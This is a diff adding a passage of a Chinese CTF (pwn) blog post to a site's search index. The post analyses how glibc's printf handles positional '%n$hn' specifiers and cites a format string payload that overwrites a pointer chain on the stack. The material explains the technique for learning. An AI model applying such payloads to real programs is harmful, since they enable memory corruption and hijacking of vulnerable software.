+<li><code>LABEL (mod_halfhalf)</code><ul>
+<li>当遇到 <code>hh</code> 修饰符时，设置 <code>is_short</code> 为 0，并将 <code>is_char</code> 设置为 1。这表示后续参数将被视为 <code>unsigned char</code> 类型。</li>
+<li>跳转到 <code>step4_jumps</code>，继续后续解析。</li>
+</ul>
+</li>
+</ul>
+<p><strong>处理 <code>l</code> 修饰符</strong>：</p>
+<ul>
+<li><code>LABEL (mod_long)</code><ul>
+<li>当遇到 <code>l</code> 修饰符时，将 <code>is_long</code> 设置为 1，表示后续的参数应被视为 <code>long int</code> 类型。</li>
+<li>跳转到 <code>step3b_jumps</code>，继续解析。</li>
+</ul>
+</li>
+</ul>
+<p><strong>处理 <code>L</code>、<code>q</code> 或 <code>ll</code> 修饰符</strong>：</p>
+<ul>
+<li><code>LABEL (mod_longlong)</code><ul>
+<li>当遇到 <code>L</code>、<code>q</code> 或 <code>ll</code> 修饰符时，将 <code>is_long_double</code> 设置为 1，并将 <code>is_long</code> 设置为 1。这表明后续参数应被视为 <code>long double</code> 类型或 <code>long long int</code> 类型。</li>
+<li>这个标签后不允许有其他修饰符，因此跳转到 <code>step4_jumps</code>，继续后续解析。</li>
+</ul>
+</li>
+</ul>
+<p>解析完成后，我们发现栈上的内容实际已经被修改了，而后面的内容还没有开始解析。所以在%hn这种方式进行解析后会直接写入目标地址。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001113356649.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001113519869.png"
+                      class=""
+                >
+
+<p>之后解析到$时会跳转到<code>do_positional</code>进行进一步操作，然后会调用printf_positional进行进一步操作。这边如果步过就能直接完成操作了。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (*f == L_(<span class="string">&#x27;$&#x27;</span>))</span><br><span class="line"><span class="comment">/* Oh, oh.  The argument comes from a positional parameter.  */</span></span><br><span class="line">	<span class="keyword">goto</span> do_positional;</span><br><span class="line">JUMP (*f, step1_jumps);</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">do_positional:</span><br><span class="line">  done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,</span><br><span class="line">			    done, nspecs_done, lead_str_end, work_buffer,</span><br><span class="line">			    save_errno, grouping, thousands_sep, mode_flags);</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>现在我们来看看用<code>payload = f&quot;%&#123;part1&#125;c%15$hn&quot; + f&quot;%&#123;part2&#125;c%45$hn&quot;</code>这个会发生什么。首先在前面<code>%xxxc</code>会直接打印占位符，同样的，我们现在关注指向程序名的链条。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001120346608.png"
+                      class=""
+                >
+
+<p>程序在解析<code>%&#123;part1&#125;c%15$hn</code>时，会进入<code>printf_positional</code>进行进一步处理，其中解析的核心函数是 <code>nargs += __parse_one_specmb (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);</code> 然后会发现解析完前面的内容之后，栈上那个指向程序名的指针并没有被改变。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001120419249.png"
+                      class=""
+                >
+
+<p>当解析完最后一个之后，会进入如下两个switch分支：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; nspecs; ++cnt)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If the width is determined by an argument this is an int.  */</span></span><br><span class="line">      <span class="keyword">if</span> (specs[cnt].width_arg != <span class="number">-1</span>)</span><br><span class="line">	args_type[specs[cnt].width_arg] = PA_INT;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* If the precision is determined by an argument this is an int.  */</span></span><br><span class="line">      <span class="keyword">if</span> (specs[cnt].prec_arg != <span class="number">-1</span>)</span><br><span class="line">	args_type[specs[cnt].prec_arg] = PA_INT;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">switch</span> (specs[cnt].ndata_args)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0</span>:		<span class="comment">/* No arguments.  */</span></span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:		<span class="comment">/* One argument; we already have the</span></span><br><span class="line"><span class="comment">			   type and size.  */</span></span><br><span class="line">	  args_type[specs[cnt].data_arg] = specs[cnt].data_arg_type;</span><br><span class="line">	  args_size[specs[cnt].data_arg] = specs[cnt].size;</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">	  <span class="comment">/* We have more than one argument for this format spec.</span></span><br><span class="line"><span class="comment">	     We must call the arginfo function again to determine</span></span><br><span class="line"><span class="comment">	     all the types.  */</span></span><br><span class="line">	  (<span class="type">void</span>) (*__printf_arginfo_table[specs[cnt].info.spec])</span><br><span class="line">	    (&amp;specs[cnt].info,</span><br><span class="line">	     specs[cnt].ndata_args, &amp;args_type[specs[cnt].data_arg],</span><br><span class="line">	     &amp;args_size[specs[cnt].data_arg]);</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">--------------------------------------------------------------------------------------------------</span><br><span class="line">      <span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; nargs; ++cnt)</span><br><span class="line">    <span class="keyword">switch</span> (args_type[cnt])</span><br><span class="line">      &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T(tag, mem, type)				\</span></span><br><span class="line"><span class="meta">	case tag:					\</span></span><br><span class="line"><span class="meta">	  args_value[cnt].mem = va_arg (*ap_savep, type); \</span></span><br><span class="line"><span class="meta">	  break</span></span><br><span class="line"></span><br><span class="line">	T (PA_WCHAR, pa_wchar, <span class="type">wint_t</span>);</span><br><span class="line">      <span class="keyword">case</span> PA_CHAR:				<span class="comment">/* Promoted.  */</span></span><br><span class="line">      <span class="keyword">case</span> PA_INT|PA_FLAG_SHORT:		<span class="comment">/* Promoted.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LONG_MAX == INT_MAX</span></span><br><span class="line">      <span class="keyword">case</span> PA_INT|PA_FLAG_LONG:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	T (PA_INT, pa_int, <span class="type">int</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LONG_MAX == LONG_LONG_MAX</span></span><br><span class="line">      <span class="keyword">case</span> PA_INT|PA_FLAG_LONG:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	T (PA_INT|PA_FLAG_LONG_LONG, pa_long_long_int, <span class="type">long</span> <span class="type">long</span> <span class="type">int</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LONG_MAX != INT_MAX &amp;&amp; LONG_MAX != LONG_LONG_MAX</span></span><br><span class="line"><span class="meta"># <span class="keyword">error</span> <span class="string">&quot;he?&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">case</span> PA_FLOAT:				<span class="comment">/* Promoted.  */</span></span><br><span class="line">	T (PA_DOUBLE, pa_double, <span class="type">double</span>);</span><br><span class="line">      <span class="keyword">case</span> PA_DOUBLE|PA_FLAG_LONG_DOUBLE:</span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely ((mode_flags &amp; PRINTF_LDBL_IS_DBL) != <span class="number">0</span>))</span><br><span class="line">	  &#123;</span><br><span class="line">	    args_value[cnt].pa_double = va_arg (*ap_savep, <span class="type">double</span>);</span><br><span class="line">	    args_type[cnt] &amp;= ~PA_FLAG_LONG_DOUBLE;</span><br><span class="line">	  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __HAVE_FLOAT128_UNLIKE_LDBL</span></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> ((mode_flags &amp; PRINTF_LDBL_USES_FLOAT128) != <span class="number">0</span>)</span><br><span class="line">	  args_value[cnt].pa_float128 = va_arg (*ap_savep, <span class="type">_Float128</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	  args_value[cnt].pa_long_double = va_arg (*ap_savep, <span class="type">long</span> <span class="type">double</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> PA_STRING:				<span class="comment">/* All pointers are the same */</span></span><br><span class="line">      <span class="keyword">case</span> PA_WSTRING:			<span class="comment">/* All pointers are the same */</span></span><br><span class="line">	T (PA_POINTER, pa_pointer, <span class="type">void</span> *);</span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> T</span></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">	<span class="keyword">if</span> ((args_type[cnt] &amp; PA_FLAG_PTR) != <span class="number">0</span>)</span><br><span class="line">	  args_value[cnt].pa_pointer = va_arg (*ap_savep, <span class="type">void</span> *);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (__glibc_unlikely (__printf_va_arg_table != <span class="literal">NULL</span>)</span><br><span class="line">		 &amp;&amp; __printf_va_arg_table[args_type[cnt] - PA_LAST] != <span class="literal">NULL</span>)</span><br><span class="line">	  &#123;</span><br><span class="line">	    args_value[cnt].pa_user = alloca (args_size[cnt]);</span><br><span class="line">	    (*__printf_va_arg_table[args_type[cnt] - PA_LAST])</span><br><span class="line">	      (args_value[cnt].pa_user, ap_savep);</span><br><span class="line">	  &#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	  <span class="built_in">memset</span> (&amp;args_value[cnt], <span class="number">0</span>, <span class="keyword">sizeof</span> (args_value[cnt]));</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">	<span class="comment">/* Error case.  Not all parameters appear in N$ format</span></span><br><span class="line"><span class="comment">	   strings.  We have no way to determine their type.  */</span></span><br><span class="line">	assert ((mode_flags &amp; PRINTF_FORTIFY) != <span class="number">0</span>);</span><br><span class="line">	__libc_fatal (<span class="string">&quot;*** invalid %N$ use detected ***\n&quot;</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>**第一个 <code>switch</code>**：解析格式说明符并确定各个参数的类型和大小，建立参数类型映射。</p>
+<p>**第二个 <code>switch</code>**：根据映射提取实际参数，确保能够正确处理可变参数列表，确保每个参数的类型和大小都被正确使用。</p>
+<p>最后会统一处理格式化说明符。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Now walk through all format specifiers and process them.  */</span></span><br><span class="line">  <span class="keyword">for</span> (; (<span class="type">size_t</span>) nspecs_done &lt; nspecs; ++nspecs_done)</span><br><span class="line">    &#123;</span><br><span class="line">      ..............................</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001121745055.png"
+                      class=""
+                >
+
+<p>这里步过一次后会跳转到这个位置，我们能发现rcx被指向了.&#x2F;pwn，也就是第一次15偏移处的位置，执行两次后就把原来指向程序名的指针修改了。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001122059746.png"
+                      class=""
+                >
+
+<p>之后再处理后，会发现改的是原来的的内容，<code>./</code>被改成了<code>\x08\x12</code>。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001123259237.png"
+                      class=""
+                >
+
+<p>分析到这其实大体原理已经清晰了，如果硬要从源码分析的话也定位到了相关函数，但感觉再分析下去效率太低了，以后有研究的需求再深入分析吧。</p>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>format string</tag>
       </tags>
   </entry>
 </search>
